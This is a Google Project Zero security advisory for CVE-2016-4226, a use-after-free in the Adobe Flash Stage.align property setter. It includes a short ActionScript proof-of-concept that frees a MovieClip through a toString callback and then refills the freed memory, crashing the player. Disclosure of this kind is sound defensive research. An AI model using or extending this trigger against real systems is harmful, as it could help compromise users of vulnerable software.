title: Adobe Flash - Stage.align Setter Use-After-Free
author: Google Security Research
cves: CVE-2016-4226

Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=838
 
There is a use-after-free in the Stage.align property setter. When the setter is called, the parameter is converted to a string early, as a part of the new use-after-free prevention changes. This conversion can invoke script, which if the this object is a MovieClip, can delete the object, deleting the thread the call is made from, which can lead to a use-after-free.
 
A proof-of-concept is as follows:
 
this.createEmptyMovieClip("mc", 2);
var o = { toString : f };
mc.func = ASnative(666, 4); //Stage.align setter
mc.func(o);
 
function f(){
     
    trace("here");
    mc.removeMovieClip();
    for(var i = 0; i < 100; i++){    
        var t = new TextFormat(); // fill up the slots
         
        }
    }
 
A fla and swf are attached. The swf crashes in Chrome for Windows.
